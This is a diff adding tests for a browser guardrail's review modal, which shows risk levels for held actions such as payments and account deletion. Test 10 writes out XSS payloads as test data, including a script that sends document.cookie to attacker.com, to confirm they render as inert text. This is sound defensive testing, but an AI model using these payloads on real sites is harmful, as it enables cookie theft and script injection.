@@ -222,17 +222,29 @@ const mockWin = new MockWindow();
 (globalThis as any).document = mockDoc;
 (globalThis as any).window = mockWin;
 
-import { ActionCategory, ActionType } from '../types/actions.js';
-import { InterceptionState } from '../types/interception.js';
-import { ResponseAction } from '../types/response.js';
+import { classifyAction } from '../classifier/index.js';
+import { assessRisk } from '../risk/index.js';
+import { createStagingActionContext } from './context.js';
+import {
+  ActionCategory,
+  ActionType,
+  GuardrailAction,
+} from '../types/actions.js';
+import { InterceptionRecord, InterceptionState } from '../types/interception.js';
+import { ResponseAction, ResponseDecision } from '../types/response.js';
 import { RiskLevel } from '../types/risk.js';
 import { StagingActionContext } from '../types/staging.js';
 import {
   STAGING_HOST_ELEMENT_ID,
   dismissStagingModal,
+  formatActionTypeName,
+  formatCategoryName,
+  getRiskLevelPresentation,
+  getSafeDisplayHost,
   getStagingModalShadowRoot,
   isStagingModalActive,
   showStagingModal,
+  translateRiskReason,
   updateStagingModal,
 } from './modal.js';
 
@@ -550,6 +562,429 @@ console.log('\n▶ Test 7: In-Place Update Capability');
     'Updated Action Description',
     'Updated description rendered in place'
   );
+
+  dismissStagingModal();
+}
+
+// =============================================================================
+// TEST 8: REAL PIPELINE INTEGRATION ACROSS RISK LEVELS (LOW, MEDIUM, HIGH, CRITICAL)
+// =============================================================================
+console.log('\n▶ Test 8: Real Pipeline Integration Across Risk Levels');
+{
+  // Subtest 8A: LOW-RISK Routine Action
+  console.log('  → Subtest 8A: Low-Risk Action (Generic / Docs Link)');
+  const lowAction: GuardrailAction = {
+    id: 'act-low-pipeline-1',
+    type: ActionType.CLICK,
+    element: { tagName: 'BUTTON', id: 'btn-docs', visibleText: 'View Documentation' },
+    page: { url: 'https://docs.service.internal/guide', title: 'Service Docs' },
+    timestamp: '2026-10-13T12:00:00.000Z',
+  };
+  const lowClassification = classifyAction(lowAction);
+  const lowRisk = assessRisk(lowAction, lowClassification);
+  const lowDecision: ResponseDecision = {
+    actionId: lowAction.id,
+    response: ResponseAction.ALLOW,
+    reasons: ['Routine action allowed under default policy'],
+    createdAt: new Date().toISOString(),
+  };
+  const lowRecord: InterceptionRecord = {
+    actionId: lowAction.id,
+    state: InterceptionState.HELD,
+    createdAt: new Date().toISOString(),
+    reason: 'Held for preview testing',
+  };
+  const lowContext = createStagingActionContext({
+    action: lowAction,
+    classification: lowClassification,
+    risk: lowRisk,
+    decision: lowDecision,
+    interception: lowRecord,
+  });
+
+  assertEquals(lowRisk.riskLevel, RiskLevel.LOW, 'Pipeline evaluates low action to LOW risk');
+  showStagingModal({ context: lowContext });
+  let shadow = getStagingModalShadowRoot();
+
+  const lowCard = shadow?.querySelector('.gs-risk-treatment');
+  assert(Boolean(lowCard?.classList.contains('gs-risk-low')), 'Modal applies .gs-risk-low styling');
+  assertEquals(shadow?.querySelector('.gs-risk-badge')?.textContent, `LOW (${lowRisk.score})`, 'Risk badge shows LOW with score');
+  assert(Boolean(shadow?.querySelector('.gs-risk-headline')?.textContent?.includes('Routine Activity')), 'Reassuring routine activity headline');
+  assert(Boolean(shadow?.querySelector('.gs-action-desc')?.textContent?.includes('View Documentation')), 'Readable action description rendered');
+
+  // Verify website hostname rendered safely
+  const metaLabels = shadow?.querySelectorAll('.gs-meta-label') || [];
+  const metaValues = shadow?.querySelectorAll('.gs-meta-value') || [];
+  let websiteValue = '';
+  metaLabels.forEach((label, idx) => {
+    if (label.textContent === 'Website') {
+      websiteValue = metaValues[idx]?.textContent || '';
+    }
+  });
+  assertEquals(websiteValue, 'docs.service.internal', 'Website hostname rendered safely');
+
+  // Verify risk reason translated to non-technical plain English
+  const lowReasonItems = shadow?.querySelectorAll('.gs-reason-item') || [];
+  assertEquals(lowReasonItems.length, 1, 'Exactly one reason item rendered');
+  const lowHeadline = shadow?.querySelector('.gs-reason-summary')?.textContent;
+  const lowDetail = shadow?.querySelector('.gs-reason-detail')?.textContent;
+  assertEquals(lowHeadline, 'Routine Interaction', 'Reason headline translated to friendly summary');
+  assertEquals(lowDetail, 'No elevated risk signals detected. Routine interaction.', 'Preserves exact risk engine reason in detail');
+
+  // Subtest 8B: MEDIUM-RISK Action (Payment Trigger)
+  console.log('  → Subtest 8B: Medium-Risk Action (Payment Flow)');
+  const medAction: GuardrailAction = {
+    id: 'act-med-pipeline-2',
+    type: ActionType.CLICK,
+    element: { tagName: 'BUTTON', id: 'btn-pay-now', visibleText: 'Pay ₹2,500' },
+    page: { url: 'https://checkout.shop.com/pay', title: 'Payment Checkout' },
+    timestamp: '2026-10-13T12:00:00.000Z',
+  };
+  const medClassification = classifyAction(medAction);
+  const medRisk = assessRisk(medAction, medClassification);
+  const medDecision: ResponseDecision = {
+    actionId: medAction.id,
+    response: ResponseAction.WARN,
+    reasons: ['Payment flow triggered'],
+    createdAt: new Date().toISOString(),
+  };
+  const medRecord: InterceptionRecord = {
+    actionId: medAction.id,
+    state: InterceptionState.HELD,
+    createdAt: new Date().toISOString(),
+    reason: 'Held for preview testing',
+  };
+  const medContext = createStagingActionContext({
+    action: medAction,
+    classification: medClassification,
+    risk: medRisk,
+    decision: medDecision,
+    interception: medRecord,
+  });
+
+  assertEquals(medClassification.category, ActionCategory.PAYMENT, 'Classifier categorizes as PAYMENT');
+  assertEquals(medRisk.riskLevel, RiskLevel.MEDIUM, 'Risk engine evaluates payment to MEDIUM risk');
+  assertEquals(medRisk.score, 40, 'Payment action score contribution is 40');
+
+  updateStagingModal({ context: medContext });
+  shadow = getStagingModalShadowRoot();
+
+  const medCard = shadow?.querySelector('.gs-risk-treatment');
+  assert(Boolean(medCard?.classList.contains('gs-risk-medium')), 'Modal applies .gs-risk-medium styling');
+  assertEquals(shadow?.querySelector('.gs-risk-badge')?.textContent, 'MEDIUM (40)', 'Risk badge shows MEDIUM (40)');
+
+  // Verify non-technical category label
+  let categoryValue = '';
+  shadow?.querySelectorAll('.gs-meta-label').forEach((label, idx) => {
+    if (label.textContent === 'Category') {
+      categoryValue = shadow?.querySelectorAll('.gs-meta-value')[idx]?.textContent || '';
+    }
+  });
+  assertEquals(categoryValue, 'Payment & Billing', 'Category formatted as "Payment & Billing"');
+
+  // Verify risk reason headline and detail
+  const medHeadline = shadow?.querySelector('.gs-reason-summary')?.textContent;
+  const medDetail = shadow?.querySelector('.gs-reason-detail')?.textContent;
+  assertEquals(medHeadline, 'Payment or Billing Activity', 'Risk reason translated to non-technical headline');
+  assertEquals(medDetail, 'Action interacts with financial transactions, checkout flows, or billing elements.', 'Detail displays exact risk engine explanation');
+
+  // Subtest 8C: HIGH-RISK Action (Destructive Deletion)
+  console.log('  → Subtest 8C: High-Risk Action (Destructive Account Removal)');
+  const highAction: GuardrailAction = {
+    id: 'act-high-pipeline-3',
+    type: ActionType.CLICK,
+    element: { tagName: 'BUTTON', id: 'btn-delete-account', visibleText: 'Delete Account' },
+    page: { url: 'https://security.service.com/account/delete', title: 'Delete Account' },
+    timestamp: '2026-10-13T12:00:00.000Z',
+  };
+  const highClassification = classifyAction(highAction);
+  const highRisk = assessRisk(highAction, highClassification);
+  const highDecision: ResponseDecision = {
+    actionId: highAction.id,
+    response: ResponseAction.PROTECT,
+    reasons: ['Destructive deletion requires protective gating'],
+    createdAt: new Date().toISOString(),
+  };
+  const highRecord: InterceptionRecord = {
+    actionId: highAction.id,
+    state: InterceptionState.HELD,
+    createdAt: new Date().toISOString(),
+    reason: 'Held for preview testing',
+  };
+  const highContext = createStagingActionContext({
+    action: highAction,
+    classification: highClassification,
+    risk: highRisk,
+    decision: highDecision,
+    interception: highRecord,
+  });
+
+  assertEquals(highClassification.category, ActionCategory.DESTRUCTIVE, 'Classifier categorizes as DESTRUCTIVE');
+  assertEquals(highRisk.riskLevel, RiskLevel.HIGH, 'Risk engine evaluates destructive action to HIGH risk');
+  assertEquals(highRisk.score, 50, 'Destructive action score contribution is 50');
+
+  updateStagingModal({ context: highContext });
+  shadow = getStagingModalShadowRoot();
+
+  const highCard = shadow?.querySelector('.gs-risk-treatment');
+  assert(Boolean(highCard?.classList.contains('gs-risk-high')), 'Modal applies .gs-risk-high styling');
+  assertEquals(shadow?.querySelector('.gs-risk-badge')?.textContent, 'HIGH (50)', 'Risk badge shows HIGH (50)');
+  assert(Boolean(shadow?.querySelector('.gs-risk-headline')?.textContent?.includes('Sensitive Operation')), 'Reassuring sensitive operation headline');
+
+  // Verify translated reason
+  const highReasonSummary = shadow?.querySelector('.gs-reason-summary')?.textContent;
+  const highReasonDetail = shadow?.querySelector('.gs-reason-detail')?.textContent;
+  assertEquals(highReasonSummary, 'Permanent Removal or Deletion', 'Translated to "Permanent Removal or Deletion"');
+  assertEquals(highReasonDetail, 'Action initiates permanent resource deletion, cancellation, or irreversible state destruction.', 'Supplied risk engine reason preserved in detail');
+
+  // Subtest 8D: CRITICAL-RISK Action (Compounded High-Risk Signals)
+  console.log('  → Subtest 8D: Critical-Risk Action (Compounded Destructive + Payment)');
+  const critAction: GuardrailAction = {
+    id: 'act-crit-pipeline-4',
+    type: ActionType.CLICK,
+    element: { tagName: 'BUTTON', id: 'btn-terminate-pay', visibleText: 'Delete Account and Pay Outstanding' },
+    page: { url: 'https://security.service.com/account/terminate', title: 'Terminate Account' },
+    timestamp: '2026-10-13T12:00:00.000Z',
+  };
+  const critClassification = classifyAction(critAction);
+  const critRisk = assessRisk(critAction, critClassification);
+  const critDecision: ResponseDecision = {
+    actionId: critAction.id,
+    response: ResponseAction.PROTECT,
+    reasons: ['Compounded high-risk signals require protective gating'],
+    createdAt: new Date().toISOString(),
+  };
+  const critRecord: InterceptionRecord = {
+    actionId: critAction.id,
+    state: InterceptionState.HELD,
+    createdAt: new Date().toISOString(),
+    reason: 'Held for preview testing',
+  };
+  const critContext = createStagingActionContext({
+    action: critAction,
+    classification: critClassification,
+    risk: critRisk,
+    decision: critDecision,
+    interception: critRecord,
+  });
+
+  assertEquals(critRisk.riskLevel, RiskLevel.CRITICAL, 'Compounded action reaches CRITICAL risk level');
+  assertEquals(critRisk.score, 90, 'Score sums DESTRUCTIVE (50) + PAYMENT (40) = 90');
+
+  updateStagingModal({ context: critContext });
+  shadow = getStagingModalShadowRoot();
+
+  const critCard = shadow?.querySelector('.gs-risk-treatment');
+  assert(Boolean(critCard?.classList.contains('gs-risk-critical')), 'Modal applies .gs-risk-critical styling');
+  assertEquals(shadow?.querySelector('.gs-risk-badge')?.textContent, 'CRITICAL (90)', 'Risk badge shows CRITICAL (90)');
+  assert(Boolean(shadow?.querySelector('.gs-risk-headline')?.textContent?.includes('High-Impact Action')), 'High-impact headline without claiming malice');
+  assertEquals(shadow?.querySelectorAll('.gs-reason-item').length, 2, 'Renders both compounded risk reasons');
+
+  dismissStagingModal();
+}
+
+// =============================================================================
+// TEST 9: GRACEFUL DEGRADATION ON MISSING & UNKNOWN METADATA
+// =============================================================================
+console.log('\n▶ Test 9: Graceful Degradation on Missing & Unknown Metadata');
+{
+  // 9A: Missing or empty description
+  const noDescContext = createSampleContext({
+    description: '   ',
+  });
+  showStagingModal({ context: noDescContext });
+  let shadow = getStagingModalShadowRoot();
+  assertEquals(
+    shadow?.querySelector('.gs-action-desc')?.textContent,
+    'Action held for review on this page',
+    'Empty description degrades to reassuring fallback'
+  );
+
+  // 9B: Missing / empty risk reasons
+  const noReasonsContext = createSampleContext({
+    riskReasons: [],
+  });
+  updateStagingModal({ context: noReasonsContext });
+  shadow = getStagingModalShadowRoot();
+  assertEquals(shadow?.querySelectorAll('.gs-reason-item').length, 1, 'Falls back to 1 safety notice item');
+  assertEquals(
+    shadow?.querySelector('.gs-reason-summary')?.textContent,
+    'Standard Safety Check',
+    'Fallback reason summary is "Standard Safety Check"'
+  );
+  assertEquals(
+    shadow?.querySelector('.gs-reason-detail')?.textContent,
+    'Guardrail paused this action as a standard safety precaution based on current settings.',
+    'Fallback detail explains standard safety settings'
+  );
+
+  // 9C: Unknown category and unknown actionType
+  const unknownCatContext = createSampleContext({
+    category: 'CUSTOM_THIRD_PARTY_CATEGORY' as any,
+    actionType: 'CUSTOM_EVENT_TYPE' as any,
+  });
+  updateStagingModal({ context: unknownCatContext });
+  shadow = getStagingModalShadowRoot();
+
+  let catVal = '';
+  let mechVal = '';
+  shadow?.querySelectorAll('.gs-meta-label').forEach((label, idx) => {
+    if (label.textContent === 'Category') {
+      catVal = shadow?.querySelectorAll('.gs-meta-value')[idx]?.textContent || '';
+    }
+    if (label.textContent === 'Mechanism') {
+      mechVal = shadow?.querySelectorAll('.gs-meta-value')[idx]?.textContent || '';
+    }
+  });
+  assertEquals(catVal, 'General Activity', 'Unknown category degrades gracefully to "General Activity"');
+  assertEquals(mechVal, 'Standard Interaction', 'Unknown actionType degrades gracefully to "Standard Interaction"');
+
+  // 9D: Missing origin and hostname
+  const noHostContext = createSampleContext({
+    origin: undefined,
+    hostname: undefined,
+  });
+  updateStagingModal({ context: noHostContext });
+  shadow = getStagingModalShadowRoot();
+  let foundWebsiteLabel = false;
+  shadow?.querySelectorAll('.gs-meta-label').forEach((label) => {
+    if (label.textContent === 'Website') {
+      foundWebsiteLabel = true;
+    }
+  });
+  assertEquals(foundWebsiteLabel, false, 'Website item completely omitted when origin and hostname are unavailable');
+
+  // 9E: Missing risk score (undefined)
+  const noScoreContext = createSampleContext({
+    riskLevel: RiskLevel.LOW,
+    riskScore: undefined,
+  });
+  updateStagingModal({ context: noScoreContext });
+  shadow = getStagingModalShadowRoot();
+  assertEquals(
+    shadow?.querySelector('.gs-risk-badge')?.textContent,
+    'LOW',
+    'Missing riskScore displays level without empty parentheses or NaN'
+  );
+
+  // 9F: Missing actionId
+  const noIdContext = createSampleContext({
+    actionId: '   ',
+  });
+  updateStagingModal({ context: noIdContext });
+  shadow = getStagingModalShadowRoot();
+  let auditVal = '';
+  shadow?.querySelectorAll('.gs-meta-label').forEach((label, idx) => {
+    if (label.textContent === 'Audit ID') {
+      auditVal = shadow?.querySelectorAll('.gs-meta-value')[idx]?.textContent || '';
+    }
+  });
+  assertEquals(auditVal, 'N/A', 'Empty actionId degrades gracefully to "N/A"');
+
+  dismissStagingModal();
+}
+
+// =============================================================================
+// TEST 10: POTENTIALLY HOSTILE DISPLAY STRINGS & SANITIZATION EDGE CASES
+// =============================================================================
+console.log('\n▶ Test 10: Potentially Hostile Display Strings & Sanitization Edge Cases');
+{
+  // 10A: XSS injection vectors in action description
+  const hostileDesc = '<script>fetch("https://attacker.com/steal?c=" + document.cookie)</script><b onmouseover="alert(1)">Click Me</b>';
+  const hostileContext = createSampleContext({
+    description: hostileDesc,
+  });
+  showStagingModal({ context: hostileContext });
+  let shadow = getStagingModalShadowRoot();
+  const descEl = shadow?.querySelector('.gs-action-desc');
+  assertEquals(descEl?.textContent, hostileDesc, 'Hostile script string assigned purely as textContent');
+  assertEquals(descEl?.children.length, 0, 'No DOM elements or script nodes created from hostile description');
+
+  // 10B: Malicious and dangerous URLs / hostnames
+  assertEquals(getSafeDisplayHost('javascript:alert(1)', undefined), null, 'Rejects javascript: URI');
+  assertEquals(getSafeDisplayHost('data:text/html,<script>alert(1)</script>', undefined), null, 'Rejects data: URI');
+  assertEquals(getSafeDisplayHost('http://user:password@evil.com/path', undefined), null, 'Rejects URLs with credentials');
+  assertEquals(getSafeDisplayHost(undefined, 'user:pass@evil.com'), null, 'Rejects hostnames with user:pass@ credentials');
+  assertEquals(getSafeDisplayHost('about:blank', undefined), null, 'Rejects about:blank');
+  assertEquals(getSafeDisplayHost(undefined, '<script>evil.com'), null, 'Rejects hostnames with HTML brackets');
+  assertEquals(getSafeDisplayHost(undefined, 'evil.com/exploit'), null, 'Rejects hostnames containing slashes');
+
+  // Verify clean, valid hostnames pass validation
+  assertEquals(getSafeDisplayHost('https://secure.bank.com:8443/checkout', 'secure.bank.com'), 'secure.bank.com', 'Accepts valid secure hostname');
+  assertEquals(getSafeDisplayHost('http://localhost:3000', 'localhost'), 'localhost', 'Accepts localhost');
+
+  // When context contains a malicious origin, verify the Website item is omitted
+  const maliciousHostContext = createSampleContext({
+    origin: 'javascript:alert(document.cookie)',
+    hostname: 'javascript:alert(1)',
+  });
+  updateStagingModal({ context: maliciousHostContext });
+  shadow = getStagingModalShadowRoot();
+  let foundMaliciousWebsite = false;
+  shadow?.querySelectorAll('.gs-meta-label').forEach((label) => {
+    if (label.textContent === 'Website') {
+      foundMaliciousWebsite = true;
+    }
+  });
+  assertEquals(foundMaliciousWebsite, false, 'Malicious origin/hostname rejected; Website field omitted');
+
+  // 10C: XSS vectors in risk reasons
+  const hostileReasonContext = createSampleContext({
+    riskReasons: [
+      '<img src=x onerror=alert("hacked")> Destructive deletion signal',
+      '<svg/onload=alert("xss")> Financial interaction signal',
+    ],
+  });
+  updateStagingModal({ context: hostileReasonContext });
+  shadow = getStagingModalShadowRoot();
+  const reasonDetails = shadow?.querySelectorAll('.gs-reason-detail') || [];
+  assertEquals(reasonDetails.length, 2, 'Renders two hostile reason details');
+  assertEquals(reasonDetails[0]?.children.length, 0, 'No image element created in reason detail');
+  assertEquals(reasonDetails[1]?.children.length, 0, 'No svg element created in reason detail');
+
+  // 10D: Direct validation of translateRiskReason
+  const paymentTranslation = translateRiskReason('Action interacts with financial transactions, checkout flows, or billing elements.');
+  assertEquals(paymentTranslation.headline, 'Payment or Billing Activity', 'Correct headline for payment reason');
+
+  const destructiveTranslation = translateRiskReason('Action initiates permanent resource deletion, cancellation, or irreversible state destruction.');
+  assertEquals(destructiveTranslation.headline, 'Permanent Removal or Deletion', 'Correct headline for destructive reason');
+
+  const authTranslation = translateRiskReason('Action interacts with authentication boundaries, credential inputs, or login sessions.');
+  assertEquals(authTranslation.headline, 'Sign-in or Account Credentials', 'Correct headline for auth reason');
+
+  const downloadTranslation = translateRiskReason('Action triggers a file download, software installation, or document export.');
+  assertEquals(downloadTranslation.headline, 'File Download', 'Correct headline for download reason');
+
+  const extNavTranslation = translateRiskReason('Action navigates away from the current trusted domain to an external destination.');
+  assertEquals(extNavTranslation.headline, 'External Website Destination', 'Correct headline for external nav reason');
+
+  const fallbackTranslation = translateRiskReason('');
+  assertEquals(fallbackTranslation.headline, 'Standard Safety Check', 'Empty reason translates to Standard Safety Check');
+
+  // 10E: Direct validation of getRiskLevelPresentation
+  const critPres = getRiskLevelPresentation(RiskLevel.CRITICAL);
+  assertEquals(critPres.className, 'gs-risk-critical', 'Critical presentation has gs-risk-critical class');
+  assert(Boolean(critPres.headline.includes('High-Impact Action')), 'Critical presentation headline describes high impact');
+
+  const highPres = getRiskLevelPresentation(RiskLevel.HIGH);
+  assertEquals(highPres.className, 'gs-risk-high', 'High presentation has gs-risk-high class');
+  assert(Boolean(highPres.headline.includes('Sensitive Operation')), 'High presentation headline describes sensitive operation');
+
+  const medPres = getRiskLevelPresentation(RiskLevel.MEDIUM);
+  assertEquals(medPres.className, 'gs-risk-medium', 'Medium presentation has gs-risk-medium class');
+
+  const lowPres = getRiskLevelPresentation(RiskLevel.LOW);
+  assertEquals(lowPres.className, 'gs-risk-low', 'Low presentation has gs-risk-low class');
+
+  // 10F: Direct validation of formatActionTypeName & formatCategoryName
+  assertEquals(formatActionTypeName(ActionType.CLICK), 'Button / Link Click', 'Formats CLICK action type');
+  assertEquals(formatActionTypeName(ActionType.SUBMIT), 'Form Submission', 'Formats SUBMIT action type');
+  assertEquals(formatActionTypeName(undefined), 'Standard Interaction', 'Formats undefined action type');
+
+  assertEquals(formatCategoryName(ActionCategory.PAYMENT), 'Payment & Billing', 'Formats PAYMENT category');
+  assertEquals(formatCategoryName(ActionCategory.DESTRUCTIVE), 'Permanent Deletion / Removal', 'Formats DESTRUCTIVE category');
+  assertEquals(formatCategoryName(ActionCategory.AUTHENTICATION), 'Authentication & Login', 'Formats AUTHENTICATION category');
+  assertEquals(formatCategoryName(undefined), 'General Activity', 'Formats undefined category');
 
   dismissStagingModal();
 }
